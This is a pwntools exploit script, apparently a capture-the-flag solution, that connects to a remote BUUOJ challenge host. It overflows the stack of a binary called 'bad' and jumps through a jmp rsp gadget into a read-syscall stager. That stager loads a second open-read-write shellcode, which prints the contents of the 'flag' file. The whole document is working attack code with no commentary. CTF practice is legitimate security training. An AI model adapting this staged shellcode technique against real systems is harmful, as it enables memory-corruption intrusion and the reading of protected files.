from pwn import *

#p = process('./bad')
p = remote('node4.buuoj.cn', 27017)
#gdb.attach(p, 'b *0x400a01')

context.arch = 'amd64'
context.log_level = 'debug'

mmap = 0x123000
jmp_rsp = 0x400a01

shellcode_1 = '''
xor rax,rax
xor rdi,rdi
mov rsi,0x123000
mov rdx,0x40
syscall
call rsi
'''

shellcode_3 = '''
sub rsp, 0x30
jmp rsp
'''

shellcode_1 = asm(shellcode_1)
shellcode_1 = shellcode_1.ljust(0x28, b'\0') + p64(jmp_rsp)
shellcode_1 += asm(shellcode_3)

shellcode2 = '''

'''

shellcode_2 = shellcraft.open('flag')
shellcode_2 += shellcraft.read('rax', mmap + 0x200, 0x100)
shellcode_2 += shellcraft.write(1, mmap + 0x200, 0x100)


p.sendafter(b'Easy shellcode, have fun!\n', shellcode_1)
p.send(asm(shellcode_2))

p.interactive()